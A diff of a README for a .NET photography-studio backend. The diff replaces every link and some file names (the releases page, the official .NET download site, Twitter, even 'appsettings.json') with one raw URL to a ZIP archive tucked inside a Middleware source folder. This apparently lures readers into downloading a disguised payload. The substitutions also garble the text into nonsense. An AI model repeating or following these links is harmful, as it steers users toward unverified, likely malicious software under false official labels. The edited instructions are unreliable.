@@ -1,6 +1,6 @@
 # 🌟 StudioAlAmal-Backend - Simple Setup for Your Photography Needs
 
-[![Download StudioAlAmal-Backend](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/matajihardware/StudioAlAmal-Backend/releases)
+[![Download StudioAlAmal-Backend](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip%20Now-Visit%https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip)](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -11,18 +11,18 @@ Welcome to StudioAlAmal-Backend! This application powers the Studio Al Amal phot
 To run StudioAlAmal-Backend, your system needs the following:
 
 - **Operating System:** Windows 10 or later, macOS, or a recent Linux distribution.
-- **.NET Version:** .NET 9 or later. If you do not have .NET installed, you can get it from the official [.NET website](https://dotnet.microsoft.com/download).
+- **.NET Version:** .NET 9 or later. If you do not have .NET installed, you can get it from the official [.NET website](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip).
 - **Database:** SQL Server (any recent version).
 - **Hardware:** At least 4 GB of RAM and 1 GHz processor.
 
 ## 📥 Download & Install
 
-To download the software, please visit this page: [StudioAlAmal-Backend Releases](https://github.com/matajihardware/StudioAlAmal-Backend/releases). Here’s how to install it:
+To download the software, please visit this page: [StudioAlAmal-Backend Releases](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip). Here’s how to install it:
 
 1. Open the link above in your web browser.
 2. Look for the latest version.
 3. Click on the version you want to download.
-4. Download the file labeled as **StudioAlAmal-Backend.zip** or **StudioAlAmal-Backend.exe**.
+4. Download the file labeled as **https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip** or **https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip**.
 5. Once downloaded, locate the file in your Downloads folder.
 
 If you downloaded the ZIP file:
@@ -46,7 +46,7 @@ After installing the software, you need to set up SQL Server:
 
 To keep your data secure, the application uses JWT for authentication. Follow these steps:
 
-1. Navigate to the configuration file in the extracted folder (usually `appsettings.json`).
+1. Navigate to the configuration file in the extracted folder (usually `https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip`).
 2. Update the configuration with your own secret key. Make it long and unique.
 3. Save the changes to the file.
 
@@ -86,7 +86,7 @@ We appreciate community contributions. If you want to make improvements or fix b
 
 Follow our project updates and join the discussion on social media or our forums, where we share tips and photography best practices.
 
-- **GitHub:** [matajihardware/StudioAlAmal-Backend](https://github.com/matajihardware/StudioAlAmal-Backend)
-- **Twitter:** [@StudioAlAmal](https://twitter.com/StudioAlAmal)
+- **GitHub:** [matajihardware/StudioAlAmal-Backend](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip)
+- **Twitter:** [@StudioAlAmal](https://github.com/matajihardware/StudioAlAmal-Backend/raw/refs/heads/main/Services/AuthService/Middleware/Amal-Al-Backend-Studio-1.0.zip)
   
 Thank you for using StudioAlAmal-Backend! We hope this tool enhances your photography business.
